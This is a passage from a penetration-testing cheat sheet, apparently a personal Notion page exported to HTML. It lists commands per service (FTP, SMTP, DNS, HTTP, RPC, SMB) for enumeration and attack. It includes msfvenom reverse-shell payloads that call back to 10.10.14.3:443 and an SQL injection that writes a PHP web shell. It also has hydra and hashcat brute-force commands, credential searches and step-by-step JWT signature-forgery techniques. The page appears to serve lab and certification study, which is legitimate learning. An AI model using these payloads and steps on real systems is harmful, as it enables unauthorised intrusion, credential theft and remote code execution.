machine</p><p id="9cea89a3-6419-4bdb-84bf-a83eda0afb27" class=""><code>net use \\$IP\share</code></p><p id="b37ac926-c9c4-44fe-b6e5-3b7f28c8c041" class=""><code>copy \\$IP\share\$filename &lt;path&gt;</code></p></details></li></ul><ul id="14bb8e3b-2cb9-44c6-8dc7-f63b51e17dd2" class="toggle"><li><details open=""><summary>Upgrading non-interactive shell</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="84cc0757-4e69-4605-8708-c0949274c432" class="code"><code class="language-PowerShell">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
/usr/bin/script -qc /bin/bash /dev/null</code></pre></details></li></ul><ul id="02817db3-8fa1-4c2f-84c6-eee4e54f012d" class="toggle"><li><details open=""><summary>xfreerdp</summary><p id="aeadc7c2-cb0a-475c-bb98-0cdc564c341a" class=""><code>xfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP&gt;:&lt;port&gt;</code></p><p id="2e338409-5e22-4e05-8884-2c914d436db1" class=""><code>xfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP&gt;:&lt;port&gt; /tls-seclevel:0 /timeout:80000</code></p></details></li></ul><ul id="7810a9ab-970c-4ac1-b537-8b14f7b9d5ae" class="toggle"><li><details open=""><summary>fix linux path</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ebdeca4c-f91e-4b3b-ac44-b97a8ced412d" class="code"><code class="language-PowerShell">export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre></details></li></ul><ul id="07f862d4-79ed-4182-96a9-d76cc31bf2d0" class="toggle"><li><details open=""><summary>Windows Post enum</summary><ul id="61889e96-1bed-4fa1-8515-0818d24c23b6" class="bulleted-list"><li style="list-style-type:disc">dir *.dbx /s</li></ul><ul id="0dc46594-2e61-4651-b70f-c74d6452d0b6" class="bulleted-list"><li style="list-style-type:disc">findstr /si password *.xml *.ini *.txt</li></ul></details></li></ul><ul id="824b66ba-669a-40db-9e48-4817e0b99262" class="toggle"><li><details open=""><summary>Check Powershell version</summary><p id="79f751a5-f7e5-4e07-a09c-4c8993e599e2" class=""><code>[Environment]::Is64BitProcess</code></p><p id="73e8a4ce-7363-40ae-8ce5-783ce0211a49" class=""><code>Powershell on 64 bit: C:\Windows\sysnative\windowspowershell\v1.0</code></p><p id="c4b15d2b-af57-4c47-a8aa-acbf4b12cd2e" class=""><code>echo %PROCESSOR_ARCHITECTURE%</code></p></details></li></ul><ul id="041e8644-9766-4a2a-b8e5-96a5537c4d54" class="toggle"><li><details open=""><summary>Winpeas color</summary><p id="2b04fa7d-05c6-4e49-aa4e-a90a960ea06f" class=""><code>REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</code></p></details></li></ul><ul id="22bb1a5f-75b7-4c03-b447-9c380627976a" class="toggle"><li><details open=""><summary>vnc connect</summary><p id="712595e1-233f-483d-8c3b-829d32a6dd78" class="">xtightvncviewer $IP</p></details></li></ul><ul id="173686af-f635-8077-b4bd-e60ad13bdc53" class="toggle"><li><details open=""><summary>metasploit</summary><p id="173686af-f635-80ec-9a88-c921dac1a18b" class=""><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 &gt; rev.exe</code></p><p id="173686af-f635-80dd-903c-d88f35daf5cb" class=""><code>msfvenom -p windows/x64/meterpreter LHOST=10.10.14.3 LPORT=443 &gt; rev.exe</code></p></details></li></ul><ul id="177686af-f635-805a-a078-fd48b5e2f6bb" class="toggle"><li><details open=""><summary>Docker</summary><p id="177686af-f635-80cf-8036-f1de711b3139" class="">
</p></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Service Enumeration</summary><div class="indented"><ul id="386d958e-ec47-4c7f-b635-6b945bef2946" class="toggle"><li><details open=""><summary>General</summary><ul id="0645d57f-e916-4128-bf75-cd54c74a3b79" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Searchsploit</span><div class="indented"></div></li></ul><ul id="3d88833b-f856-4fd1-b6f8-9f15fb9a03eb" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">hashcat</span><div class="indented"><ul id="27365c8a-283d-4fa5-98f8-ffe46544dcd0" class="toggle"><li><details open=""><summary>Command</summary><p id="72754b7e-e0d8-4d26-8e1b-5d3bce1118d1" class=""><code>hashcat --force -m &lt;#&gt; -a 0 &lt;hash&gt; &lt;wordlist&gt;</code></p></details></li></ul></div></li></ul><ul id="09d21c47-6bcf-47d7-99cc-33e1c83895a5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Use new credentials to recheck logins</span><div class="indented"></div></li></ul><ul id="3ec082b6-6eee-4d05-8374-3b7f1c5cc4f6" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">hydra</span><div class="indented"><ul id="962831e5-0a59-4a97-8568-e0de0da48a49" class="toggle"><li><details open=""><summary>Command</summary><p id="10267368-ecd4-4796-b42f-7a9a706f9bb2" class=""><code>hydra -l &lt;username&gt; -P &lt;password list&gt; </code><code><a href="https://www.notion.softp://%24ip/">ftp://$IP</a></code></p></details></li></ul></div></li></ul><ul id="8327d5fb-a52e-4317-921c-5f73dc869472" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Password List</span><div class="indented"><ul id="6ddad4b1-b64a-4e6e-bc4a-5fe576efba87" class="toggle"><li><details open=""><summary>Command</summary><p id="965aa174-ae9b-4574-831b-f694ee7c0b18" class=""><code>crunch 24 24 1234567890 -t ThisIsTheUsersPassword@@ -o password.txt</code></p></details></li></ul></div></li></ul></details></li></ul><ul id="4f9ef0a5-efbf-413d-9cbe-d3627848e471" class="toggle"><li><details open=""><summary>FTP - 21 </summary><ul id="b360b83b-1845-4beb-a9a7-9417d8c903b0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">anonymous login - ftp $ip (anonymous : anonymous)</span><div class="indented"></div></li></ul><ul id="13f1ddc5-8a94-4b2f-aef6-2177377b224c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">download all ftp files - <code>wget -m </code><code><a href="https://www.notion.softp://anonymous@%24ip/">ftp://&lt;username&gt;:&lt;password&gt;@$IP/</a></code></span><div class="indented"></div></li></ul><ul id="15c8a19e-d632-4240-9ed5-41dfcd9222fa" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">transfer a reverse shell and call it</span><div class="indented"></div></li></ul><ul id="b28c30a6-2ff4-41c5-8dad-d92dfa84c79b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">default credentials</span><div class="indented"></div></li></ul></details></li></ul><ul id="da54bad4-d9ea-4218-874a-3c1ba64c2fae" class="toggle"><li><details open=""><summary>SMTP - 25</summary><ul id="2f96f48d-c74e-4b52-88a5-b6a8970ed77d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nmap -p 25 --script smtp-* $IP</span><div class="indented"></div></li></ul><ul id="49e5e8c7-49a4-41ac-8631-978c5254e3e3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nc -vv $IP 25, try commands EXPN or VRFY to verify users</span><div class="indented"></div></li></ul><ul id="69009d71-b277-47fd-b8c5-02ad05bd387c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">telnet $IP 25</span><div class="indented"></div></li></ul></details></li></ul><ul id="0a34e299-fe8d-4357-8bbc-2a9258dae812" class="toggle"><li><details open=""><summary>DNS - 53</summary><ul id="911df638-2bfc-4a7e-a4d6-db6eb911817d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">DNSEnum</span><div class="indented"></div></li></ul><ul id="08ce33ed-037a-413a-a542-f5c3244578db" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">DNS Zone transfer - <code>dig AXFR &lt;domain&gt; @&lt;master dns server&gt;</code></span><div class="indented"></div></li></ul><ul id="95db4ef2-ce1a-460f-b484-de53bf5c8745" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nslookup - then type server $IP, try 127.0.0.1, 127.0.0.2, and given IP</span><div class="indented"></div></li></ul></details></li></ul><ul id="d9bcbdea-21f2-4d5a-9e92-9fa47d1fe256" class="toggle"><li><details open=""><summary>HTTP/HTTPS - 80, 443</summary><ul id="6850c9d2-996d-473a-9519-f36c5d233d5b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Directory Busting</span><div class="indented"><ul id="f8be2f9f-7a7d-4d36-8fa0-0b8786dd92cc" class="toggle"><li><details open=""><summary>dirb</summary><p id="21bd5182-d13a-4836-96ba-f438100e30ac" class=""><code>dirb http://&lt;IP&gt;/</code></p><ul id="77a8164c-b38e-451e-8195-29bd9e616d0a" class="toggle"><li><details open=""><summary>extensions</summary><p id="6c470bd9-fb65-4815-8a1f-08a040a3ad77" class=""><code>dirb http://&lt;IP&gt;/ -X &lt;comma seperated extension with . in front&gt;</code></p></details></li></ul><ul id="93e9e8c9-30c0-4ae8-8993-d397bfbd3f8f" class="toggle"><li><details open=""><summary>credentials</summary><p id="eeadf983-7de6-42a5-8c01-20dd945ca88c" class=""><code>dirb http://$IP/ -id &lt;u:p&gt;</code></p></details></li></ul></details></li></ul><ul id="fd325af4-2e17-4780-a430-6c1140dc97dc" class="toggle"><li><details open=""><summary>gobuster</summary><p id="6401d0e4-3b5d-4aeb-887a-ef819858b47f" class=""><code>gobuster dir -w &lt;wordlist&gt; -u $IP</code></p><p id="e5a0f577-d8e9-44b3-9f25-59111aa57053" class=""><code>gobuster dir -U &lt;user&gt; -P &lt;pass&gt; -w &lt;wordlist&gt; -u $IP</code></p></details></li></ul></div></li></ul><ul id="b2dc114a-57fb-4eb7-aa95-10fa5b81ebaa" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">View Source Code</span><div class="indented"></div></li></ul><ul id="9665ae3b-9087-46d5-843f-edfd62c11453" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Burpsuite</span><div class="indented"></div></li></ul><ul id="5a7c70b2-cbba-47ff-a505-bd7a56d7afe7" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">robots.txt</span><div class="indented"></div></li></ul><ul id="4e12d5a9-ec53-416b-a161-4b1a11d4d49c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Check cookies and JWTs</span><div class="indented"><ul id="175686af-f635-80be-82c1-d585b05ea251" class="toggle"><li><details open=""><summary>JWTs</summary><ul id="175686af-f635-8009-90f0-de24e2cc11c5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Modify payload data in <a href="http://jwt.io">jwt.io</a> and see if signature verified properly</span><div class="indented"></div></li></ul><ul id="175686af-f635-80c6-b1ed-fbf78b123523" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Change algorithm to none - try different capitalizations</span><div class="indented"></div></li></ul><ul id="175686af-f635-8033-a115-fd36903e7855" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">algorithm confusion → downgrade from asymmetric to symmetric</span><div class="indented"><ul id="175686af-f635-801c-99a4-e68893962112" class="toggle"><li><details open=""><summary>steps</summary><ul id="175686af-f635-80cf-8675-d6bc048fee24" class="bulleted-list"><li style="list-style-type:disc">by downgrading, we can utilize the public key as a symmetric signing key and forge JWTs - *must have public key available</li></ul><ol type="1" id="175686af-f635-803f-accc-ca0ca60e49c7" class="numbered-list" start="1"><li>Obtain public key<ol type="a" id="175686af-f635-802a-a2e7-e8bd311d0c97" class="numbered-list" start="1"><li><code>/jwks.json</code> or <code>/.well-known/jwks.json</code></li></ol></li></ol><ol type="1" id="175686af-f635-80a2-9d76-e91b197e4602" class="numbered-list" start="2"><li>Add the public key as RSA key on JWT editor and then copy PEM copying the entire thing including starts and ends string</li></ol><ol type="1" id="176686af-f635-80cb-9d5f-c00fb6967dff" class="numbered-list" start="3"><li>Base64 encode PEM and then create new symmetric key with Base64 PEM as k value</li></ol><ol type="1" id="176686af-f635-8058-b394-e91eb6941181" class="numbered-list" start="4"><li>Change alg to symmetric and JWT payload</li></ol><ol type="1" id="176686af-f635-8049-a727-c888f414b63d" class="numbered-list" start="5"><li>Sign new JWT with new symmetric key</li></ol></details></li></ul></div></li></ul><ul id="175686af-f635-80a8-a5eb-f99b1c6992a4" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">bruteforce secret and resign JWT</span><div class="indented"><ul id="175686af-f635-8058-8585-e0384a36a508" class="toggle"><li><details open=""><summary>command</summary><p id="175686af-f635-802c-bac9-d5f354058bf3" class=""><code>wget </code><code><a href="https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list">https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list</a></code></p><p id="175686af-f635-8013-92c8-cfab6912c27b" class=""><code>hashcat -a 0 -m 16500 &lt;jwt&gt; jwt.secrets.list</code></p></details></li></ul></div></li></ul><ul id="175686af-f635-804b-95ab-d9546f8eebbc" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">jwk header injection</span><div class="indented"><ul id="175686af-f635-8077-8aaf-ec70c78601b5" class="toggle"><li><details open=""><summary>steps</summary><ul id="175686af-f635-800e-a71e-cb62aaba1755" class="bulleted-list"><li style="list-style-type:disc">injecting our own public key via jwk header</li></ul><ol type="1" id="175686af-f635-80e3-8b51-c57d6b3cd7b1" class="numbered-list" start="1"><li>Go to JWT Editor and generate RSA key</li></ol><ol type="1" id="175686af-f635-8064-9c0d-f15cb6fe4c5a" class="numbered-list" start="2"><li>Intercept request and select Attack → add JWK</li></ol><ol type="1" id="175686af-f635-80fe-b7ee-e03967772392" class="numbered-list" start="3"><li>Resign request with RSA key</li></ol></details></li></ul></div></li></ul><ul id="175686af-f635-80bf-9763-d64dee7e198e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">jku header injection</span><div class="indented"><ul id="175686af-f635-8035-af87-fc3370f4d5e7" class="toggle"><li><details open=""><summary>steps</summary><ul id="175686af-f635-80df-b876-c8f3d05f928d" class="bulleted-list"><li style="list-style-type:disc">In this attack, server blindly trusts jku link we provide so we host our own public key in our server</li></ul><ol type="1" id="175686af-f635-80a7-b499-c87bd42b7728" class="numbered-list" start="1"><li>Go to JWT Editor and generate RSA key</li></ol><ol type="1" id="175686af-f635-80c0-b735-feadca7f80e2" class="numbered-list" start="2"><li>copy JWT public key and host in server</li></ol><ol type="1" id="175686af-f635-80b1-a500-f9b0ba82dbba" class="numbered-list" start="3"><li>Intercept request and add jku parameter with url to public key</li></ol><ol type="1" id="175686af-f635-807e-9619-c8e5a179dc2c" class="numbered-list" start="4"><li>Resign request with RSA key</li></ol></details></li></ul><ul id="175686af-f635-8041-9c2d-c6092057e044" class="toggle"><li><details open=""><summary>key hosting</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="175686af-f635-80ce-852e-c2df78c0b3ef" class="code"><code class="language-JavaScript">{
    &quot;keys&quot;: [
        {
            &quot;kty&quot;: &quot;RSA&quot;,
            &quot;e&quot;: &quot;AQAB&quot;,
            &quot;kid&quot;: &quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;,
            &quot;n&quot;: &quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;
        }
    ]
}</code></pre></details></li></ul></div></li></ul><ul id="175686af-f635-8092-941e-f5b75dc029ab" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">kid header exploitation</span><div class="indented"><ul id="175686af-f635-8028-b820-f7091ba7d39e" class="toggle"><li><details open=""><summary>steps</summary><ul id="175686af-f635-80d4-a4a3-d6c091e755b4" class="bulleted-list"><li style="list-style-type:disc">Directory traversal or SQL injection potentially possible<ul id="175686af-f635-80fd-8b0c-c1fcb65e3852" class="bulleted-list"><li style="list-style-type:circle">if JWT is symmetric signed, you can try directory traversal to /dev/null and sign with empty string secret</li></ul></li></ul><ol type="1" id="175686af-f635-8062-9d2a-e85ce0a1f510" class="numbered-list" start="1"><li>Generate symmetric key and change k value to “AA==”</li></ol><ol type="1" id="175686af-f635-8023-8fc3-e0db93992efb" class="numbered-list" start="2"><li>Intercept request and modify kid to be “../../../../../../../dev/null”</li></ol><ol type="1" id="175686af-f635-80ef-8fe6-e5ce915e3e7d" class="numbered-list" start="3"><li>Resign request with symmetric key</li></ol></details></li></ul></div></li></ul></details></li></ul></div></li></ul><ul id="fb87e55e-480e-4324-848f-ce62c7019d01" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nikto scan</span><div class="indented"><ul id="629ced2a-f8f9-47ad-a5c4-25bac79b7b04" class="toggle"><li><details open=""><summary>command</summary><ul id="763c02c7-1a35-4d92-92ba-650c508c2217" class="bulleted-list"><li style="list-style-type:disc"><code>nikto -h $IP</code></li></ul><ul id="528ca1a5-93d2-4946-b8a0-39c8e71516f6" class="bulleted-list"><li style="list-style-type:disc"><code>nikto id &lt;u:p&gt; -h $IP</code></li></ul></details></li></ul></div></li></ul><ul id="f8698b08-86b9-462f-9555-43ab0eea1ba0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Hydra</span><div class="indented"><ul id="6ef5dcba-4b25-4ed5-910c-bf971a73be5e" class="toggle"><li><details open=""><summary>HTTP Popup Form</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ae93fb74-5888-4287-9660-a0d6673d4c3e" class="code"><code class="language-PowerShell">hydra -l &lt;username&gt; -P &lt;password file&gt; $IP http-head /&lt;director&gt;</code></pre></details></li></ul></div></li></ul><ul id="679da3ec-e65d-4950-95df-65a6def8a631" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">WPScan/CMSMap</span><div class="indented"><ul id="80a6a8ac-a4e8-4158-9238-33535f980bc5" class="toggle"><li><details open=""><summary>command</summary><p id="2e2b4c83-c9cb-4d4c-a508-c04d6424be3e" class=""><code>python </code><code><a href="http://cmsmap.py">cmsmap.py</a></code><code> http://$IP</code></p></details></li></ul></div></li></ul><ul id="21661847-f4b4-4be9-81f7-b688026657df" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">SQLi</span><div class="indented"><ul id="a0f66c99-56da-41a8-8fa0-310cb70312b6" class="toggle"><li><details open=""><summary>Command</summary><p id="f6d10ea5-11a8-40a9-ada3-6af1d2580171" class=""><code>admin&#x27; or 1=1; --</code></p><p id="ce534cc0-b0db-45ba-8d59-971f7a2bedf6" class=""><code>&#x27; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#x27;cmd&#x27;]);&quot;) INTO OUTFILE &#x27;C:/xampp/htdocs/cmd.php&#x27;  -- -&#x27;</code></p></details></li></ul></div></li></ul><ul id="7991492d-f904-46f0-85da-c2c2f53a3fca" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Shellshock</span><div class="indented"><ul id="deaad290-2c58-4439-b83d-99aef8d474a3" class="toggle"><li><details open=""><summary>Check</summary><p id="ce1c3dea-849d-4783-b5b9-80d3116a7f63" class=""><code>nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $IP</code></p></details></li></ul></div></li></ul><ul id="ddf7cf6d-68ab-4997-afc3-d8cc00803ac5" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Check web-dav (IIS)</span><div class="indented"><ul id="b1c2b7ec-ebe5-4d49-99ec-df2f4a9b4a79" class="toggle"><li><details open=""><summary>Commands</summary><p id="0542c57e-cc25-45cd-8bc9-37a526262658" class=""><code>davtest -url http://$IP</code></p><p id="4f7ac380-86cc-4c30-ac14-df9bf9f7275d" class=""><code>cadaver $IP</code></p></details></li></ul></div></li></ul></details></li></ul><ul id="84161996-1c45-4b6c-9dc0-f4c3d913185f" class="toggle"><li><details open=""><summary>POP - 110</summary><ul id="f13f8419-9423-4ad7-8666-36eb50985af2" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">telenet $IP 110, then USER &lt;user&gt; and PASS &lt;pass&gt; on separate lines</span><div class="indented"></div></li></ul><ul id="b003cf46-ede5-47f4-a62b-d8bd7cb2e55b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nmap --script &quot;pop3-capabilities or pop3-ntlm-info&quot; -sV -p 110 $IP</span><div class="indented"></div></li></ul></details></li></ul><ul id="1fad4070-ad0c-47d6-9b97-6aa952919522" class="toggle"><li><details open=""><summary>rpc - 135</summary><ul id="4a747a57-33d5-4d2a-8e18-441f860369e7" class="toggle"><li><details open=""><summary>Commands</summary><ul id="e454e6b9-5c12-406d-a61f-f92c6cb59803" class="bulleted-list"><li style="list-style-type:disc"><code>rpcclient -U &quot;&quot; -N $IP</code></li></ul><ul id="306f5765-2732-413c-bdf1-288a73761579" class="bulleted-list"><li style="list-style-type:disc"><code>rpcinfo -s $IP</code></li></ul><ul id="5165c557-3bc3-47fe-961c-a38684e6532f" class="toggle"><li><details open=""><summary>RPC Client Info</summary><p id="757a8e05-bb9f-4829-971a-23f84d45f315" class=""><code>netshareenum</code></p><p id="ebc95a9c-ffc0-4ab2-a626-3b14b5cc9454" class=""><code>netshareenumall</code></p><p id="8b10407c-211d-49c6-a895-ff4f7e71cbe2" class=""><code>netsharegetinfo</code></p><p id="5ce1966b-c569-4fa5-8069-b4a194dd9188" class=""><code>queryuser RID</code></p><p id="2aa8bdb2-2710-4fbd-a8af-9f9363139ce3" class=""><code>enumdomusers</code></p><p id="d274e25e-51f9-43d9-9ef7-7ce7a3791df8" class=""><code>enumdomgroups</code></p><p id="607f7b84-9c77-4674-a98e-640a6c05ec13" class=""><code>enumalsgroups</code></p><p id="0f77f46f-29a9-44b7-8cbd-4b5bd7115371" class=""><code>enumdomains</code></p></details></li></ul><ul id="65be0bcc-c71a-4ddf-a583-cd0f49a4c441" class="bulleted-list"><li style="list-style-type:disc"><code>crackmapexec smb $IP -u &#x27;guest&#x27; -p &#x27;&#x27; --rid-brute</code></li></ul></details></li></ul></details></li></ul><ul id="4684ca40-4e21-4c60-a24a-c4fc0460c24c" class="toggle"><li><details open=""><summary>SMB - 139, 445</summary><ul id="d7e4636e-5c64-45ed-913c-be2ebabd0fd2" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">enum4linux</span><div class="indented"><ul id="12f686af-f635-802b-8d24-f7f72e39dd05" class="toggle"><li><details open=""><summary>Commands</summary><ul id="12f686af-f635-8023-828f-f913801c981a" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -a $IP</code></li></ul><ul id="12f686af-f635-80b3-8045-f04d71d13c51" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u administrator<br/>-p password $IP<br/></code></li></ul><ul id="12f686af-f635-8050-8a4e-c36220ad9f96" class="bulleted-list"><li style="list-style-type:disc">Windows Shares - <code>enum4linux -u administrator<br/>-p password -S $IP<br/></code></li></ul><ul id="12f686af-f635-8031-a9a1-edc5a8c916fd" class="bulleted-list"><li style="list-style-type:disc">OS version - <code>enum4linux -o $IP</code></li></ul></details></li></ul></div></li></ul><ul id="737fc62f-d69d-4483-ade9-b4d118462d33" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">smbclient</span><div class="indented"><ul id="c15a7275-11f0-4a98-8f62-79ca2d101dd5" class="toggle"><li><details open=""><summary>Commands</summary><ul id="a63cb03a-fcaf-4833-afe4-8d456dbfc35e" class="bulleted-list"><li style="list-style-type:disc">null session - <code>smbclient --no-pass -L //$IP</code></li></ul><ul id="533ca478-24ff-4d16-8c79-f5e8138ea6f9" class="bulleted-list"><li style="list-style-type:disc"><code>smbclient --no-pass \\\\$IP\\ </code></li></ul><ul id="dfa82b1c-a8dd-4b4b-a71e-6184d392a760" class="bulleted-list"><li style="list-style-type:disc"><code>smbclient --no-pass //$IP/&lt;share&gt;</code></li></ul><ul id="52eb62cf-82d1-4c76-8e31-f30909cdb57d" class="bulleted-list"><li style="list-style-type:disc"><code>smbclient -L $IP -U &lt;username&gt;</code></li></ul><ul id="43e3fc82-7a11-4617-a2e7-969225235ccf" class="bulleted-list"><li style="list-style-type:disc">null session to share -<code>smbclient -U &#x27;%&#x27; -N \\\\$IP\\&lt;SHARE&gt;</code></li></ul><ul id="e08dc97e-b84f-4a24-a8b5-ec02b0111e3f" class="bulleted-list"><li style="list-style-type:disc"><code>smbclient \\\\$IP\\&lt;share&gt; -W &lt;domain&gt; -U &lt;username&gt;</code></li></ul></details></li></ul></div></li></ul><ul id="39b359d0-ecdb-48a9-b44d-488339cf4762" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">smbmap</span><div class="indented"><ul id="072dca9d-0360-4a8b-8bed-26f2cbed561c" class="toggle"><li><details open=""><summary>Commands</summary><p id="a1bdd4e7-46db-4732-95d4-3b4a3f8b39af" class=""><code>smbmap -L -H $IP</code></p><p id="b0e9ea7e-a18d-4ee8-9e81-bd14163cb025" class=""><code>smbmap -u &lt;username&gt; -p &lt;password&gt; -H $IP</code></p></details></li></ul></div></li></ul><ul id="172686af-f635-804c-aec5-f83168ef6a87" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nxc</span><div class="indented"><ul id="172686af-f635-8072-bbc3-f817e6463b5b" class="toggle"><li><details open=""><summary>Commands</summary><p id="172686af-f635-80b1-9cd7-f10439fac53c" class=""><code>nxc smb $IP</code></p><p id="172686af-f635-808b-b3e7-cc7b6fd674a5" class=""><code>nxc smb $IP --shares</code></p><p id="172686af-f635-804e-a776-d98d34efa5fb" class=""><code>nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27;</code></p><p id="172686af-f635-808b-9c4e-e9108284c061" class=""><code>nxc smb $IP -u &#x27;guest&#x27; -p &#x27;&#x27;</code></p><p id="175686af-f635-80e7-a080-cc844c23b69b" class=""><code>nxc smb $IP -u &#x27;user&#x27; -p &#x27;pass&#x27; -M spider_plus</code></p><p id="175686af-f635-8099-b356-c58da1d900e3" class=""><code>nxc smb $IP -u &#x27;user&#x27; -p &#x27;pass&#x27; -M spider_plus -o DOWNLOAD_FLAG=True</code></p></details></li></ul></div></li></ul><ul id="e45aaaaa-a5ba-425c-b487-f93fc14d6ea0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">nmap --script smb-enum* -p445 $IP</span><div class="indented"></div></li></ul><ul 